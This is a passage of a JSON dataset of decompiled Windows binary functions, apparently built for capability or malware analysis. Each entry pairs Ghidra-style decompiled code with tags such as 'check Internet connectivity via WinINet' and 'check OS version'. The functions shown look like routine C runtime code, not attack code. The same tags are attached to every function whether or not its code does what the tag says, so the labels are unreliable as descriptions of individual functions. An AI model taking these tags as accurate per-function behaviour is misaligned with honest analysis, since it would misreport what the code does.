        "decompiled_code": "\nuint __cdecl fcn.00404cc8(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040288d(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 299
    },
    "00404d2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404d2c(uint32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint32_t *arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar4;\n    uint32_t uVar3;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    uint32_t *puVar7;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    char var_13h;\n    uint8_t var_12h;\n    char var_11h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if (arg_14h == NULL) {\n        arg_14h = 0x57070c;\n    }\n    puVar6 = arg_ch;\n    if (arg_ch == NULL) {\n        arg_10h = 1;\n        puVar6 = 0x54c277;\n    }\n    puVar7 = -(arg_ch != NULL) & arg_8h;\n    if (arg_10h == 0) goto code_r0x004deeba;\n    if (*(arg_14h + 6) == 0) {\n        var_12h = *puVar6;\n        puVar6 = puVar6 + 1;\n        if (-1 < var_12h) {\n            if (puVar7 != NULL) {\n                *puVar7 = var_12h;\n            }\n            goto code_r0x004deeba;\n        }\n        if ((var_12h & 0xe0) == 0xc0) {\n            var_11h = '\\x02';\n        }\n        else if ((var_12h & 0xf0) == 0xe0) {\n            var_11h = '\\x03';\n        }\n        else {\n            if ((var_12h & 0xf8) != 0xf0) goto code_r0x004deeb3;\n            var_11h = '\\x04';\n        }\n        var_13h = var_11h;\n        uVar3 = CONCAT11(var_11h, var_11h);\n        uVar5 = (1 << (7U - var_11h & 0x1f)) - 1U & var_12h;\ncode_r0x004dee07:\n        uVar2 = uVar3 >> 8;\n        var_1ch = arg_10h;\n        if (uVar2 < arg_10h) {\n            var_1ch = uVar2;\n        }\n        var_18h = puVar6 - arg_ch;\n        while (var_18h < var_1ch) {\n            uVar1 = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_18h = var_18h + 1;\n            if ((uVar1 & 0xc0) != 0x80) goto code_r0x004deeb3;\n            uVar5 = uVar5 << 6 | uVar1 & 0x3f;\n        }\n        if (var_1ch < uVar2) {\n            *(arg_14h + 1) = uVar3;\n            *arg_14h = uVar5;\n            *(arg_14h + 6) = (uVar3 >> 8) - var_1ch;\n            goto code_r0x004deeba;\n        }\n        if (((uVar5 < 0xd800) || (0xdfff < uVar5)) && (uVar5 < 0x110000)) {\n            var_10h = 0x80;\n            var_ch = 0x800;\n            var_8h = 0x10000;\n            if ((&var_18h)[uVar3 & 0xff] <= uVar5) {\n                if (puVar7 != NULL) {\n                    *puVar7 = uVar5;\n                }\n                *arg_14h = 0;\n                arg_14h[1] = 0;\n                goto code_r0x004deeba;\n            }\n        }\n    }\n    else {\n        uVar1 = *(arg_14h + 1);\n        uVar5 = *arg_14h;\n        uVar3 = CONCAT11(*(arg_14h + 6), uVar1);\n        if (((uVar1 - 2 < 3) && (uVar4 = uVar3 >> 8,  uVar4 != 0)) && (uVar4 < uVar1)) goto code_r0x004dee07;\n    }\ncode_r0x004deeb3:\n    fcn.004025c7(arg_14h);\ncode_r0x004deeba:\n    fcn.00403085(arg_ch);\n    return;\n}\n",
        "token_count": 1134
    },
    "00466407": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00466407(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint32_t *arg_20h, \n            float *arg_24h)\n\n{\n    uint32_t *puVar1;\n    float *pfVar2;\n    char cVar3;\n    uint arg_10h_00;\n    uint in_ECX;\n    uint unaff_EBX;\n    float10 fVar4;\n    int32_t var_32ch;\n    uint *var_328h;\n    float fStack808;\n    int32_t var_320h;\n    uint var_31ch;\n    uint32_t var_4h;\n    \n    pfVar2 = arg_24h;\n    puVar1 = arg_20h;\n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_320h = 1000000000;\n    arg_10h_00 = fcn.00403c4c(in_ECX, &var_31ch, &arg_ch, &arg_14h, arg_1ch, &var_320h);\n    if (var_31ch == '\\0') {\ncode_r0x004664c5:\n        fVar4 = 0;\n        *puVar1 = 2;\n    }\n    else {\n        fVar4 = fcn.00401924(&var_31ch, &var_328h, arg_10h_00, &var_32ch);\n        fStack808 = fVar4;\n        *pfVar2 = fStack808;\n        if ((var_328h == &var_31ch) || (var_32ch != 0)) goto code_r0x004664c5;\n        if ((var_320h == 1000000000) || (var_320h == 0)) goto code_r0x004664d1;\n        fVar4 = fcn.00401b5e(fStack808, var_320h << 2);\n    }\n    *pfVar2 = fVar4;\ncode_r0x004664d1:\n    cVar3 = fcn.00403f7b(&arg_14h);\n    if (cVar3 != '\\0') {\n        *puVar1 = *puVar1 | 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    fcn.00403085(unaff_EBX);\n    return;\n}\n",
        "token_count": 570
    },
    "00404dbd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404dbd(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != '\\0') {\n        return 0xfffffffffffff;\n    }\n    return 0x7fffff;\n}\n",
        "token_count": 54
    },
    "00404def": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00404def(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    \n    cVar3 = fcn.004041e2();\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        iVar1 = *(param_1 + 0xaa4);\n        if (param_1 != param_1 + (iVar1 * 4 + 4) * 4) {\n            iVar5 = *(param_1 + 0x14);\n            piVar6 = param_1 + 0x464;\n            do {\n                iVar2 = *piVar6;\n                piVar6[2] = iVar5;\n                if (iVar2 == 1) {\ncode_r0x004a69a8:\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n                }\n                else {\n                    if (iVar2 != 2) {\n                        if (iVar2 == 3) goto code_r0x004a69a8;\n                        if (iVar2 != 4) {\n                            puVar4 = fcn.004039a4();\n                            *puVar4 = 0x16;\n                            fcn.00403751();\n                            return 0;\n                        }\n                    }\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 8;\n                }\n                iVar5 = *(param_1 + 0x14);\n                bVar7 = piVar6 != param_1 + (iVar1 * 4 + 0x119) * 4;\n                piVar6 = piVar6 + 4;\n            } while (bVar7);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 457
    },
    "00404e03": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404e03(int32_t *arg_8h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        cVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040288d(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        cVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    return CONCAT31(cVar1 >> 7, 1);\n}\n",
        "token_count": 348
    },
    "00404e2b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00404e2b(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint32_t *arg_20h, \n            double *arg_24h)\n\n{\n    uint32_t *puVar1;\n    double *pdVar2;\n    char cVar3;\n    uint arg_10h_00;\n    uint in_ECX;\n    uint unaff_EBX;\n    float10 fVar4;\n    int32_t var_328h;\n    uint *var_324h;\n    int32_t var_320h;\n    uint var_31ch;\n    uint32_t var_4h;\n    \n    pdVar2 = arg_24h;\n    puVar1 = arg_20h;\n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_320h = 1000000000;\n    arg_10h_00 = fcn.00403c4c(in_ECX, &var_31ch, &arg_ch, &arg_14h, arg_1ch, &var_320h);\n    if (var_31ch == '\\0') {\ncode_r0x004665f4:\n        fVar4 = 0;\n        *puVar1 = 2;\n    }\n    else {\n        fVar4 = fcn.00405ef7(&var_31ch, &var_324h, arg_10h_00, &var_328h);\n        *pdVar2 = fVar4;\n        if ((var_324h == &var_31ch) || (var_328h != 0)) goto code_r0x004665f4;\n        if ((var_320h == 1000000000) || (var_320h == 0)) goto code_r0x00466600;\n        fVar4 = fcn.00402bad(SUB84(fVar4, 0), fVar4 >> 0x20, var_320h << 2);\n    }\n    *pdVar2 = fVar4;\ncode_r0x00466600:\n    cVar3 = fcn.00403f7b(&arg_14h);\n    if (cVar3 != '\\0') {\n        *puVar1 = *puVar1 | 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    fcn.00403085(unaff_EBX);\n    return;\n}\n",
        "token_count": 569
    },
    "00404ed5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404ed5(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(4);\n    fcn.004060f5(0);\n    arg_8h_00 = *0x56f23c;\n    *(unaff_EBP + -4) = 0;\n    if (arg_8h_00 == NULL) {\n        arg_8h_00 = fcn.00405a88(0);\n        fcn.004017a3(arg_8h_00);\n        arg_8h_00[4] = 0x3f;\n        fcn.00404b6a(0x54d844);\n        pcVar1 = *(*arg_8h_00 + 4);\n        *0x56f214 = arg_8h_00;\n        (**0x573000)();\n        (*pcVar1)();\n        *0x56f230 = *0x56f214;\n    }\n    if (*(unaff_EBP + 8) != '\\0') {\n        pcVar1 = *(*arg_8h_00 + 4);\n        (**0x573000)();\n        (*pcVar1)();\n    }\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 337
    },
    "00404f75": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.00404f75(int16_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t **arg_10h_00;\n    int16_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int16_t **arg_10h_01;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint Locale;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    iVar3 = fcn.00404331();\n    arg_10h_01 = iVar3 + 0x50;\n    var_10h = 0;\n    Locale = 0;\n    var_8h = 0;\n    iVar4 = fcn.00404331();\n    *(iVar4 + 0x34c) = &var_10h;\n    piVar1 = arg_8h + 0x40;\n    *arg_10h_01 = arg_8h;\n    arg_10h_00 = iVar3 + 0x54;\n    *arg_10h_00 = piVar1;\n    if ((piVar1 != NULL) && (*piVar1 != 0)) {\n        fcn.004cd037(0x5539b8, *0x553b04 + -1, arg_10h_00);\n    }\n    var_10h = 0;\n    if ((*arg_10h_01 == NULL) || (**arg_10h_01 == 0)) {\n        if ((*arg_10h_00 == NULL) || (**arg_10h_00 == 0)) {\n            var_10h = 0x104;\n            Locale = (*_sym.imp.KERNEL32.dll_GetUserDefaultLCID)();\n            var_8h = Locale;\n        }\n        else {\n            fcn.004cc821(&var_10h);\n        }\ncode_r0x004cd1ca:\n        if (var_10h == 0) goto code_r0x004cd1d2;\n    }\n    else {\n        if ((*arg_10h_00 == NULL) || (**arg_10h_00 == 0)) {\n            fcn.004cc964(&var_10h);\n        }\n        else {\n            fcn.004cc8a3(&var_10h);\n        }\n        if (var_10h == 0) {\n            cVar2 = fcn.004cd037(0x553608, *0x5539b0 + -1, arg_10h_01);\n            if (cVar2 != '\\0') {\n                if ((*arg_10h_00 == NULL) || (**arg_10h_00 == 0)) {\n                    fcn.004cc964(&var_10h);\n                }\n                else {\n                    fcn.004cc8a3(&var_10h);\n                }\n            }\n            goto code_r0x004cd1ca;\n        }\n    }\n    arg_8h_00 = fcn.004cce67(-(arg_8h != NULL) & arg_8h + 0x80, &var_10h);\n    if (((arg_8h_00 != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h_00 & 0xffff),  iVar4 != 0)) &&\n       (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidLocale)(Locale, 1),  iVar4 != 0)) {\n        if (arg_ch != NULL) {\n            *arg_ch = arg_8h_00;\n        }\n        fcn.00404f2f(Locale, iVar3 + 0x2a0, 0x55, 0);\n        if (arg_10h != 0) {\n            fcn.00404f2f(Locale, arg_10h + 0x120, 0x55, 0);\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(Locale, 0x1001, arg_10h, 0x40);\n            if ((iVar3 != 0) &&\n               (iVar3 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(var_8h, 0x1002, arg_10h + 0x80, 0x40),  iVar3 != 0)) {\n                fcn.0040446c(arg_8h_00, arg_10h + 0x100, 0x10, 10);\n            }\n        }\n    }\ncode_r0x004cd1d2:\n    fcn.00403085(arg_ch);\n    return;\n}\n",
        "token_count": 1088
    },
    "00404f9d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404f9d(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        if (99 < *(param_1 + 0xaa8)) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        uVar2 = fcn.00401190(param_1 + 0x464 + *(param_1 + 0xaa8) * 0x10, 4, *(param_1 + 0x31), *(param_1 + 0x2c));\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 197
    },
    "00404fc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404fc0(int32_t *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n            uVar2 = fcn.00403751();\n            return uVar2 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar2 = fcn.00401190(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar2;\n        }\n        iVar3 = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    *arg_8h = iVar3;\n    arg_8h[1] = iVar3 >> 0x1f;\n    return CONCAT31(iVar3 >> 8, 1);\n}\n",
        "token_count": 344
    },
    "00405042": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405042(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint32_t *puVar2;\n    \n    if (*(arg_ch + 4) != '\\0') {\n        puVar1 = fcn.004047eb();\n        *puVar1 = 0;\n        puVar1[1] = arg_8h << 0x1f | 0x7ff00000;\n        return;\n    }\n    puVar2 = fcn.00401852();\n    *puVar2 = arg_8h << 0x1f | 0x7f800000;\n    return;\n}\n",
        "token_count": 150
    },
    "0040505b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint16_t * fcn.0040505b(uint16_t *param_1, uint16_t param_2)\n\n{\n    int32_t iVar1;\n    uchar auVar2 [16];\n    uchar auVar3 [16];\n    uint16_t uVar4;\n    uint16_t uVar5;\n    int32_t iStack52;\n    \n    if (0 < *0x56ec4c) {\n        auVar2 = pshuflw(ZEXT216(param_2), ZEXT216(param_2), 0);\n        do {\n            if ((param_1 & 0xfff) < 0xff1) {\n                uVar4 = SUB162(auVar2, 0);\n                uVar5 = SUB162(auVar2 >> 0x10, 0);\n                auVar3 = CONCAT214(-(param_1[7] == 0), \n                                   CONCAT212(-(param_1[6] == 0), \n                                             CONCAT210(-(param_1[5] == 0), \n                                                       CONCAT28(-(param_1[4] == 0), \n                                                                CONCAT26(-(param_1[3] == 0), \n                                                                         CONCAT24(-(param_1[2] == 0), \n                                                                                  CONCAT22(-(param_1[1] == 0), \n                                                                                           -(*param_1 == 0)))))))) |\n                         CONCAT214(-(param_1[7] == uVar5), \n                                   CONCAT212(-(param_1[6] == uVar4), \n                                             CONCAT210(-(param_1[5] == uVar5), \n                                                       CONCAT28(-(param_1[4] == uVar4), \n                                                                CONCAT26(-(param_1[3] == uVar5), \n                                                                         CONCAT24(-(param_1[2] == uVar4), \n                                                                                  CONCAT22(-(param_1[1] == uVar5), \n                                                                                           -(*param_1 == uVar4))))))));\n                uVar4 = SUB161(auVar3 >> 7, 0) & 1 | (SUB161(auVar3 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar3 >> 0x17, 0) & 1) << 2 | (SUB161(auVar3 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar3 >> 0x27, 0) & 1) << 4 | (SUB161(auVar3 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar3 >> 0x37, 0) & 1) << 6 | (SUB161(auVar3 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar3 >> 0x47, 0) & 1) << 8 | (SUB161(auVar3 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar3 >> 0x57, 0) & 1) << 10 | (SUB161(auVar3 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar3 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar3 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar3 >> 0x77, 0) & 1) << 0xe | SUB161(auVar3 >> 0x7f, 0) << 0xf;\n                if (uVar4 != 0) goto code_r0x004e1112;\n                iStack52 = 0x10;\n            }\n            else {\n                if (*param_1 == param_2) {\n                    return param_1;\n                }\n                if (*param_1 == 0) {\n                    return NULL;\n                }\n                iStack52 = 2;\n            }\n            param_1 = param_1 + iStack52;\n        } while( true );\n    }\n    uVar4 = *param_1;\n    while ((uVar4 != 0 && (uVar4 != param_2))) {\n        param_1 = param_1 + 1;\n        uVar4 = *param_1;\n    }\ncode_r0x004e10b4:\n    return (uVar4 != param_2) - 1 & param_1;\ncode_r0x004e1112:\n    iVar1 = 0;\n    if (uVar4 != 0) {\n        for (; (uVar4 >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n        }\n    }\n    param_1 = param_1 + iVar1;\n    uVar4 = *param_1;\n    goto code_r0x004e10b4;\n}\n",
        "token_count": 1095
    },
    "0040506f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040506f(uint noname_0, uint arg_ch)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_3ch;\n    uint var_4h;\n    \n    fcn.0040536c(100);\n    uVar2 = fcn.00401366();\n    *(unaff_EBP + -0x6c) = uVar2;\n    puVar3 = fcn.004026d5(unaff_EBP + -0x68);\n    *(unaff_EBP + -0x70) = extraout_ECX;\n    puVar5 = unaff_EBP + -0x3c;\n    for (iVar4 = 0xb; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 0x14) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.004026d5(unaff_EBP + -0x68);\n    uVar2 = 0x54c277;\n    iVar4 = *(unaff_EBP + -0x6c);\n    if (*(unaff_EBP + 0xc) == '\\0') {\n        uVar2 = *(iVar4 + 8);\n    }\n    uVar2 = fcn.00401c8f(uVar2);\n    *(extraout_ECX + 8) = uVar2;\n    uVar2 = fcn.004031b6(\"false\", 0, unaff_EBP + -0x3c);\n    *(extraout_ECX + 0x10) = uVar2;\n    uVar2 = fcn.004031b6(\"true\", 0, unaff_EBP + -0x3c);\n    *(extraout_ECX + 0x14) = uVar2;\n    if (*(unaff_EBP + 0xc) == '\\0') {\n        *(extraout_ECX + 0xc) = **(iVar4 + 0x30);\n        uVar1 = **(iVar4 + 0x34);\n    }\n    else {\n        uVar1 = fcn.0040548e(0x2e, 0, unaff_EBP + -0x3c);\n        *(extraout_ECX + 0xc) = uVar1;\n        uVar1 = fcn.0040548e(0x2c, 0, unaff_EBP + -0x3c);\n    }\n    *(extraout_ECX + 0xe) = uVar1;\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 716
    },
    "00405097": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar ** __cdecl fcn.00405097(char **arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint var_18h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    cVar1 = **0x56f458;\n    if (cVar1 == '\\0') {\n        fcn.004012ad(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    if (arg_10h != 0) {\n        if (cVar1 == 'X') {\n            *0x56f458 = *0x56f458 + 1;\n            if (*arg_ch == 0) {\n                var_10h = \"void\";\n                var_ch = 0x4;\n                goto code_r0x0048ee42;\n            }\n            var_10h = \"void \";\n            var_ch = 0x5;\n            goto code_r0x0048ee61;\n        }\n        if (((cVar1 == '_') && ((*0x56f458)[1] == '_')) && ((*0x56f458)[2] == 'Z')) {\n            *0x56f458 = *0x56f458 + 3;\n        }\n    }\n    if (**0x56f458 == '$') {\n        if (((*0x56f458)[1] == '$') && ((*0x56f458)[2] == 'T')) {\n            *0x56f458 = *0x56f458 + 3;\n            if (*arg_ch == 0) {\n                var_10h = \"std::nullptr_t\";\n                var_ch = 0xe;\ncode_r0x0048ee42:\n                fcn.00402cfc(&var_10h);\n                return arg_8h;\n            }\n            var_10h = \"std::nullptr_t \";\n            var_ch = 0xf;\ncode_r0x0048ee61:\n            fcn.00404025(arg_8h, &var_10h, arg_ch);\n            return arg_8h;\n        }\n    }\n    else if (**0x56f458 == 'Y') {\n        *0x56f458 = *0x56f458 + 1;\n        fcn.00401884(arg_8h, arg_ch);\n        return arg_8h;\n    }\n    fcn.00405b41(&var_8h, arg_ch);\n    if ((arg_ch[1] & 0x4000U) == 0) {\n        var_10h = var_8h;\n        var_ch = var_4h;\n        if ((arg_ch[1] & 0x2000U) == 0) goto code_r0x0048ef53;\n        var_10h = \"cli::pin_ptr<\";\n        var_ch = 0xd;\n    }\n    else {\n        var_10h = \"cli::array<\";\n        var_ch = 0xb;\n    }\n    fcn.00402cfc(&var_10h);\n    fcn.004052f9(&var_10h, &var_8h);\ncode_r0x0048ef53:\n    *arg_8h = var_10h;\n    arg_8h[1] = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 750
    },
    "0040509c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040509c(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        iVar1 = 0;\n    }\n    else if ((arg_8h == 0) || (arg_ch == 0)) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n        iVar1 = 0x7fffffff;\n    }\n    else {\n        iVar1 = 0x7fffffff;\n        if (arg_10h < 0x80000000) {\n            fcn.004057e5(arg_14h);\n            if (*(var_ch + 0xa4) == 0) {\n                iVar1 = fcn.004022b6(arg_8h, arg_ch, arg_10h);\n            }\n            else {\n                iVar3 = fcn.00405aa1(*(var_ch + 0xa4), 0x1001, arg_8h, arg_10h, arg_ch, arg_10h);\n                if (iVar3 == 0) {\n                    puVar2 = fcn.004039a4();\n                    *puVar2 = 0x16;\n                }\n                else {\n                    iVar1 = iVar3 + -2;\n                }\n            }\n         